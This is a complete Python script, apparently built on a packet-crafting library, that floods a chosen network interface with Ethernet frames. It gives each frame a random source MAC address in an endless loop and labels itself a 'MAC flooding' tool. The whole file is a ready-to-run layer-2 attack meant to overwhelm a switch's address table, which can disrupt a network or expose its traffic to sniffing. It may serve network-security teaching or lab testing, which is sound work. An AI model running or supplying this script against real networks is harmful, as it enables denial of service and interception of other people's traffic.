#!/usr/bin/env python3

import sys
from time import sleep
from random import randrange
from framebuilder import tools, eth

if len(sys.argv) < 2:
    print('Missing arguments')
    print(f'Usage: {sys.argv[0]} interface [destination address] [ether_type]')
    sys.exit(1)


if_name = sys.argv[1]
socket = tools.create_socket(if_name)
frame = eth.Frame()
if len(sys.argv) > 2:
    frame.dst_addr = sys.argv[2]
else:
    frame.dst_addr = '02:00:00:00:00:00'
if len(sys.argv) > 3:
    frame.ether_type = int(sys.argv[3], 16)
else:
    frame.ether_type = 0x0800
tools.print_rgb(f'\nMAC flooding link {if_name}', rgb=(0, 200, 0), bold=True)
try:
    while True:
        src_mac = f'{format(randrange(256), "02x")}'
        for p in range(5):
            src_mac += f':{format(randrange(256), "02x")}'
        frame.src_addr = src_mac
        frame.send(socket)
        info = f'dst={frame.dst_addr} src={src_mac} ether_type={frame.ether_type}'
        tools.print_rgb(info, rgb=(200, 200, 200), bold=True)
        sleep(0.1)
except KeyboardInterrupt:
    tools.print_rgb('\nstopped; Goodbye!', rgb=(0, 200, 0), bold=True)
    socket.close()
